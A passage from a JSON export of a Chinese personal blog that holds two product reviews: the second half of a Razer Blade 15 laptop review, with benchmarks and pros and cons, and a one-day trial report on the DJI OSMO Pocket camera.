使用的键的标识反而在直接使用的键的标识的下方…虽然影响不大，但打字时看到键盘着实觉得违和。</p>\n<p>没有了小键盘，C 面多出来的空间被留给了扬声器。<strong>而这个声音…比较一般</strong>，整体听感有些薄而含混。不过好歹是 C 面朝上的双扬声器，声音还算清楚，而且立体声的感觉较强。加上自带的 Dolby Atmos 加成，<strong>总体听感还算可以。</strong></p>\n<p>另外，开机键被藏在了右侧扬声器上方，没有灯，有些低调。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"2264\" class=\"aligncenter size-full wp-image-1392\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-300x295.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-768x756.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-1024x1008.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>系统</h1>\n<p>出厂带有 Windows 10 家庭版，预装雷蛇雷云。在雷云内不仅可以调整这台电脑的灯光、性能等设置，还可以一并调整所有连接到这台电脑的雷蛇外设的设置。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1387\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>雷云 3 主界面</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1390\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>灯光拥有丰富的自定义选项（灯厂无疑了）</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"434\" height=\"262\" class=\"aligncenter size-full wp-image-1389\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg 434w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3-300x181.jpg 300w\" sizes=\"(max-width: 434px) 100vw, 434px\"></a>\n<p><span>可以调整屏幕刷新率</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1393\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>通过 Chroma 可以在支持的软件内使键盘背光与软件内容同步</span></p>\n<p><strong>不过由于雷蛇的服务器在大陆一向不稳定，雷云在实际体验上真的是…一言难尽。</strong>有时候会莫名开机不自启、主面板无限加载、灯光配置无法应用…心累。</p>\n<p>此外，显卡驱动似乎也不太稳定（这大概是英伟达的锅？）。偶尔屏幕会突然黑掉，需要合盖再开盖才能再次唤醒屏幕；甚至有一次我遇到了 10 分钟内连续两次蓝屏…至少从错误代码来看问题出在显卡驱动。不过这些问题遇到的几率也不大，一个月内绝大部分时间它还是正常工作的，显卡驱动也没有在我游戏的时候崩掉过。还算能用吧。</p>\n<h1>性能</h1>\n<p>作为妥妥的游戏本，Razer Blade 15 配备了 i7-9750H，RTX2070 Max-Q，16 GB 内存，<strong>性能自然是不差的，基本达到了这一水平笔记本的一般水准。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"702\" height=\"400\" class=\"aligncenter size-full wp-image-1410\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg 702w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19-300x171.jpg 300w\" sizes=\"(max-width: 702px) 100vw, 702px\"></a>\n<p><span>CPU-Z 和 GPU-Z</span></p>\n<p>i7-9750H 默频 2.60GHz，睿频可达 4GHz 左右，<strong>然而只是 30 秒真男人。</strong>25度室温、高性能模式下 30 秒左右的满负载就会让这块 CPU 撞墙，频率会掉到 3GHz 出头并稳定在此，<strong>而平衡模式则更快。</strong></p>\n<p>Razer Blade 15 配备的是一块 Max-Q 版本的 RTX2070，<strong>而且是较低功耗 80W 的版本</strong>，猜测是为了散热考虑（毕竟这么薄了）。风扇全开散热时风扇声音较响，但仍能忍受；而且日常工作使用一般不会使风扇转起来，<strong>因此噪音控制还算不错。</strong></p>\n<p>由于是这篇算是简评，并没有详测游戏，直接上跑分吧。室温 25 度， 平衡模式下 Cinebench R20 分数 1927，有些偏低；而使用高性能模式时分数直接飙到 2424 分，看来平衡模式功耗墙砍得比较狠。（顺便提一句，雷蛇甚至提供了功耗更低的性能方案，没有什么测试的必要就不测了。）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"753\" height=\"637\" class=\"aligncenter size-full wp-image-1405\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg 753w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17-300x254.jpg 300w\" sizes=\"(max-width: 753px) 100vw, 753px\"></a>\n<p>在 3DMark Time Spy 测试下平衡模式 6283 分，高性能模式 6872 分，相比有一点的提升。只能说压得够狠。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"954\" class=\"aligncenter size-full wp-image-1406\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-300x149.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-768x382.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-1024x509.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>平衡模式</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"957\" class=\"aligncenter size-full wp-image-1408\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-300x150.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-768x383.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-1024x510.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>高性能模式</span></p>\n<p>至于这 16GB 的内存…至少我是完全够用，要升级的话也可以自行更换到最高 64GB。</p>\n<h1>总结</h1>\n<p>这已经不是雷蛇第一年做笔记本了。总的来看，雷蛇似乎已经有些摸清了门道。今年年中推出的配备 9 代 Intel CPU 的灵刃系列几乎可以说是在各个方面都做到了尽可能完美。当然问题也有一些，相信雷蛇可以在后续解决。总结一下我手头的这台笔记本吧。</p>\n<p>优点：</p>\n<ul>\n<li>高性能的同时有较长续航</li>\n<li>优秀的屏幕</li>\n<li>干净的外观设计</li>\n<li>薄而坚固的机身</li>\n<li>较丰富的 IO</li>\n<li>细节到位（Wi-Fi 6、Windows Hello 等等）</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>价格稍高</li>\n<li>驱动、软件等有些不稳定</li>\n<li>为了散热有一定的性能损失</li>\n<li>机身偏重</li>\n</ul>\n<p>当我正准备结束这篇简评的时候正好收到了雷蛇雷云驱动更新，其中包含了我这一型号的「问题修复与改进」。待会儿就去更新，看看雷蛇有没有解决一部分问题吧。</p>\n<p>最后加一句，本文所有图片都是由一加 7 Pro 拍摄的，也就这样吧…</p>\n","link":"https://flyhigher.top/diary/1411.html"},{"title":"OSMO Pocket 一日试用报告","date":"2019-02-02 09:38:38","description":"\n<p>计划寒假出门练练延时视频的拍摄，碰巧得知老师买了一个 <a href=\"https://www.dji.com/osmo-pocket\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OSMO Pocket</a>，正好我对这玩意儿有点兴趣，就向老师借了一天玩了玩，带着它在城市里跑了一圈，这篇文章算是试用后的总结报告。不过这毕竟只是一天快速试用之后的总结，如果有不正确或是不完善的地方还请见谅。</p>\n<p><strong>TL;DR:</strong> 这款产品目前应该只适用于重度 Vlog 拍摄者，相对其他拍摄方案有一些优势，但也有很多不足。对我来说，我本来没有太强烈的购买 OSMO Pocket 的欲望，试用过后依然没有太大的购买欲望。<strong>请谨慎考虑购买。</strong></p>\n<p>（如果出二代我可能会买吧…（小声）</p>\n<blockquote><p>这篇文章中所有图片和视频<strong>都经过二次压缩以缩短在网页上的加载时间，不代表 OSMO Pocket 的真实拍摄水平</strong>（当然所有评测都基于未压缩的原始图像），如果需要原始图像可以直接联系我。另外，本文中的多数照片/视频都是“为评测而拍”，没有刻意追求美感，虽然观感不一定好，但这不代表 OSMO Pocket 就拍不出好看的照片/视频——<strong>毕竟“人”才是一张照片是否“美”的决定因素。</strong></p></blockquote>\n<h1>初印象</h1>\n<p><strong>到手的第一印象：好小啊。</strong>虽然对 OSMO Pocket 已经提前有所了解，但刚刚接触它时仍惊讶于它的体积。就算有一层保护壳， OSMO Pocket 还是可以被轻松地放进口袋里，相对于手机+稳定器的方案，OSMO Pocket 便携多了，好评。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1867\" height=\"2500\" class=\"aligncenter size-full wp-image-1313\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg 1867w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-224x300.jpg 224w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-768x1028.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-765x1024.jpg 765w\" sizes=\"(max-width: 1867px) 100vw, 1867px\"></a>\n<p><strong>完全启动的速度挺快</strong>，不过屏幕不大。屏幕支持触摸，而机身上的实体按键只有两个。简单试用了下，在屏幕上的操作主要以滑动为主，操作逻辑还算清晰，不过这个触屏对于点击的灵敏度真的挺低的，经常出现点击却没有反应的情况 。两个实体按键之一就是拍摄键，熟悉了之后操作效率还是很高的。好评。</p>\n<p>不过由于屏幕小，实际情况下很多操作无法在屏幕上完成，<strong>因此连接手机后的 OSMO Pocket 才算得上是完整体。</strong>其与手机的连接通过物理连接（连接头）实现（不过可以通过配件实现无线连接）。</p>\n<p>我拿到 OSMO Pocket 时它已经被使用了一段时间了，手机连接头已经插在机身上了。虽然这个连接头可以卸下并反装（以保护连接头）或者换上接口保护板，但是实际操作中要卸下连接头非常麻烦，所以一般情况下为了方便使用，连接头只能以这种有点难看的姿势插在机身上。DJI 甚至考虑到了这个问题，在保护壳的绑带上切了个口子，方便连接头伸出…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"2279\" class=\"aligncenter size-full wp-image-1314\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-263x300.jpg 263w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-768x875.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-899x1024.jpg 899w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>奇葩的保护壳</p>\n<p>机身底部是一个 USB Type-C 接口，用来充电，好评。不过没有标准螺口，没法直接固定在三脚架上，需要购买额外配件，很难受。</p>\n<p>此外使用时需要从机身侧面插入一张 SD 卡用于存储拍摄内容，通过配套的 DJI Mimo APP 可以将拍摄的内容传输到手机上。DJI Mimo 同时可以在 OSMO Pocket 连接到手机后作为拍摄控制器使用。</p>\n<p>第一眼看上去，OSMO Pocket 的镜头看起来跟普通手机的镜头差不多，不过具体表现还是要在试用后才能知道。</p>\n<h1>绝赞试用中</h1>\n<p>大概熟悉了一下操作，我第二天就带着 OSMO Pocket 出门了。<strong>最大的感受是太小巧了，至少比手机+稳定器的组合甚至是 GoPro+延长杆的组合要小很多</strong>，这带来了两方面的影响，一是我可以更快地进入拍摄状态，实测我从摸口袋到 OSMO Pocket 完成启动进入拍摄状态不超过 10 秒钟；二是小巧的机身也让 OSMO Pocket 在拍摄时显得更加低调，让我这种脸皮比较薄的人减少了很多心理压力。<strong>综合起来就是让我更愿意经常取出它来拍摄了。</strong></p>\n<h2>拍摄体验</h2>\n<p>我第一个使用的功能是延时视频，结果发现没有标准螺口带来的问题比我想象的还要严重。总之最后为了能顺利地拍完延时，我不得不用一种很难受的姿势把它摁在三脚架的云台上并这样保持十几分钟…然而就算是这样后来还是翻车了（</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2428\" height=\"2500\" class=\"aligncenter size-full wp-image-1350\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg 2428w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-291x300.jpg 291w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-768x791.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-995x1024.jpg 995w\" sizes=\"(max-width: 2428px) 100vw, 2428px\"></a>\n<p>完全没法固定</p>\n<blockquote><p>买配件是不可能买配件的，这辈子都不可能买配件的，只能靠暴力摁住才勉强拍的了延时这个样子。</p></blockquote>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo3.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>摁得太用力了，三脚架云台没锁牢转偏了…</p>\n<p><strong>一个优点是拍摄延时视频时可以让云台按设定好的轨迹自动旋转。</strong>不过直接在内建屏幕上只能设定两个云台位置关键点，要连接手机才能比较方便地设定最多不超过四个关键点。延时视频的拍摄不支持防抖，任何轻微的抖动都会可能会导致成品在导出之后需要进行额外的防抖处理。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo2.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>直出延时，可以看到有轻微抖动</p>\n<p>为了方便调整云台位置我把手机插上了，然后发现这样的连接方式其实有点别扭。<strong>单手握持是不可能了：</strong>如果握着 OSMO Pocket，不仅整体重心会严重偏向手机，而且连接头大概不能长时间地支撑住悬空的手机；如果握住手机，OSMO Pocket 不算太轻的重量依然会让我担心连接头是否会损坏。算了，还是两个一起握着吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"2244\" class=\"aligncenter size-full wp-image-1315\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-300x293.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-768x749.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-1024x999.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>连接手机示意图</p>\n<p>一度考虑过要不要暂时不带 OSMO Pocket 的保护壳了，毕竟保护壳还是有点占体积的，而且每次拍摄时将本体装入取出保护壳的动作也要花一点时间。<strong>但是后来发现保护壳其实必不可少。</strong>关机后云台会自动收缩到适合装入保护壳的状态，但由于云台的姿态锁定只会持续十几秒的时间，之后云台就会解锁以至于可以随外力转动，如果不及时放回保护壳内云台就有损坏的可能。</p>\n<p>拍着拍着，突然发现…诶我的电量呢？！<strong>OSMO Pocket 的掉电非常快</strong>，大概是太小的机身里塞不下太大电池的缘故，实际使用中大概1分钟就可以掉1%的电，如果打算重度使用，一个充电宝或是官方的充电盒是必不可少的了。</p>\n<p>接着试着拍了几段视频。防抖效果不用多说了，作为 OSMO Pocket 最大卖点之一，<strong>防抖效果的确非常优秀。</strong>云台有多种跟随方式，在屏幕上点几下就能切换，很方便。可以选定一块区域让云台跟随，大部分情况下不会跟丢（除非你跑偏得云台都到限位了…）。最高支持 4K/60fps 拍摄，同时有多种帧率可选，不过想要高码率模式还得使用 1080p 拍摄。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo4.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/4.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/5.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>没有特地压缓脚步，只剩下小幅上下移动了</p>\n<p><strong>视频的收音…很迷，不能算好，甚至只能算是“勉强能听”，听起来就感觉隔着层东西。</strong>作为一个主要面向 Vlogger 的产品我不清楚这样砍音质的目的是什么，不过好在 DJI 提供了音频转接头的附件，可以外接麦克风。（又要买附件！）</p>\n<p>除了拍摄视频和延时视频，OSMO Pocket 还有拍照、全景和慢动作三个模式。拍照基本就是按一下按钮的事，不过有 M 档，可以调整快门速度等，这意味着或许可以使用 OSMO Pocket 拍摄流光照片，不过我没来得及尝试。同时可以保存 DNG 格式的照片，好评；全景只有固定的 180° 视角（可以算是1×4）和 3×3 两种模式，而且无法直接在内建屏幕上查看已拍摄的全景照片，必须使用 APP 查看（似乎全景的拼接过程也是在手机上完成的）；慢动作基本是高帧率的 1080p 视频，会在机内完成放慢的处理。<strong>值得注意的是在慢动作模式下镜头视角会变小很多（官方数据为 34.9°）。</strong></p>\n<p>配套的 APP DJI Mimo 在拍摄方面还算好用（不过首页的类抖音风格我真的受不了…）。可设置项不算多，但布局还算清晰，不难上手，跟直接在内建屏幕上操作相比，APP 用起来还是很爽的。搭配 DJI 一贯的“一键制作视频”功能，拍摄剪辑分享可以说是一气呵成。当然如果有精细制作的需求还是导出来用专业软件剪比较好。<strong>不过通过 APP 只能查看机内 SD 卡中的“成品”，比如延时视频只能导出视频而不能导出每一帧的原始图像</strong>，官方称需要使用电脑才能导出其在拍摄延时视频中拍摄的 JPEG 原始图像，不过我没来得及用电脑连上看一看。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"1080\" class=\"aligncenter size-full wp-image-1316\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-768x432.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-1024x576.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p>APP 的拍摄界面</p>\n<h2>拍摄质量</h2>\n<p>说一下“画质”。先看一下官方参数：1/2.3” CMOS，F/2，等效焦距 26mm。<strong>注意一下这个等效焦距并不广，尤其自拍的时候很容易出现“满屏幕都是脸”的情况。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"540\" height=\"362\" class=\"aligncenter size-full wp-image-1320\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg 540w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/9-300x201.jpg 300w\" sizes=\"(max-width: 540px) 100vw, 540px\"></a>\n<p>官网截图</p>\n<p>直接下结论：<strong>在我看来 OSMO Pocket 在照片/视频的拍摄质量方面与手机相比没有什么优势，甚至不如一些旗舰手机。</strong>照片比较平淡，曝光看看就好，画面放大看有比较严重的涂抹感，同时画面边缘有一些畸变。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1251\" class=\"aligncenter size-full wp-image-1336\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-1024x557.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>直出照片及其 EXIF 信息</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1360\" class=\"aligncenter size-full wp-image-1341\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-1024x557.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>当时没有拍对比照，另外用手机拍了一张大光比场景做个观感对比 (HDR+直出)</p>\n<p>夜景照片没来得及单独测试，不过从夜景延时视频的原始图像来看只能说一般般，噪点有些多，大光比场景看起来难以驾驭。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1004\" class=\"aligncenter size-full wp-image-1340 srcset=\" https: sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>夜景延时视频其中一帧的原始图像</p>\n<p>视频也类似，看得出有涂抹感，而且在大光比下容易过曝/欠曝，不过码率挺高，看起来没怎么压缩。照片看起来有所压缩，而全景则被缩放得非常厉害，基本不能放大看，不知道这是不是因为通过 APP 导出的问题，希望可以在 SD 卡中找到未压缩的原始图像。<strong>总之不管这个镜头的素质如何，最后的产出和手机相比并没有什么优势。</strong>甚至在我手机有 Google 的 HDR+ 算法加持的情况下，OSMO Pocket 的照片从观感上来说可以算是被吊打。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2490\" height=\"631\" class=\"aligncenter size-full wp-image-1335\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg 2490w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-300x76.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-768x195.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-1024x259.jpg 1024w\" sizes=\"(max-width: 2490px) 100vw, 2490px\"></a>\n<p>这张图直出尺寸只有 3984×1006</p>\n<h1>总结</h1>\n<p>OSMO Pocket 是一款优点和缺点都非常明显的产品，简单总结一下它的优缺点吧。</p>\n<p>优点：</p>\n<ul>\n<li>非常便携且启动快，可以快速进入拍摄状态</li>\n<li>优秀的防抖云台</li>\n<li>操作简单且效率高，容易上手</li>\n<li>功能还算丰富，可以满足一部分自定义的需求</li>\n<li>配合 APP 可以方便地进行拍摄分享</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>拍摄的质量与大部分手机相比没有优势</li>\n<li>贵，尤其是还有一大堆配件是需要额外购买的</li>\n<li>耗电快，续航时间比我想象的要短</li>\n<li>收音质量有待提高，镜头视角也“还不够广”</li>\n<li>部分功能感觉还有待完善</li>\n</ul>\n<p>总之，OSMO Pocket “在技术上”可以称得上是一款优秀的产品，这么小的体积却提供了优秀的防抖云台、完善的操作逻辑和不输手机的拍摄质量，很棒；<strong>但是在实用性上它的价值可能不是很高，较高的价格却无法提供相应的拍摄质量，而且对于大部分人来说，“快速进入拍摄”并不是一个痛点，这样的话，还是选择手机云台甚至相机云台吧。</strong></p>\n<p>顺便一提，由于 OSMO Pocket 在连接 Android 手机时会使用“USB 调试”功能，每当它连上我的手机时…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1080\" height=\"711\" class=\"aligncenter size-full wp-image-1318\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg 1080w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-300x198.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-768x506.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-1024x674.jpg 1024w\" sizes=\"(max-width: 1080px) 100vw, 1080px\"></a>\n<p>黑阈：？？？</p>\n<p>(╯‵□′)╯︵┻━┻</p>\n","link":"https://flyhigher.top/photograph/1309.html"}]